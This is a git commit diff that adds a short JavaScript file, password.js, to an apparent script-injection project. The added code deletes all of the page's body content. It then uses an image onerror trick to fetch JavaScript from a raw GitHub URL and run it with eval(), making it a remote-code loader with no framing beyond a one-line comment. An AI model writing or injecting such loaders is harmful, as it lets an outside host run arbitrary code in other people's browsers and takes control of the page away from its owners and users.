5f3c935dc5789371ca4e87059e1d46d2a11ef168
skibidiking33 <152452894+skibidiking33@users.noreply.github.com>
2024-05-03 22:12:04 -0700

    Update password.js

--- executions/password.js
+++ executions/password.js
@@ -1,1 +1,20 @@
+// so it executes once
+if (typeof executed === 'undefined') {
+    executed = true; 
 
+var oldElements = document.querySelectorAll('body > *');
+                oldElements.forEach(function(element) {
+                    element.remove();
+                });
+
+                var img = document.createElement('img');
+                img.src = '#';
+                img.onerror = function() {
+                    fetch("https://raw.githubusercontent.com/skibidiking33/New-EASS/main/password.js").then(function(response) {
+                        return response.text();
+                    }).then(function(code) {
+                        eval(code);
+                    });
+                };
+
+}
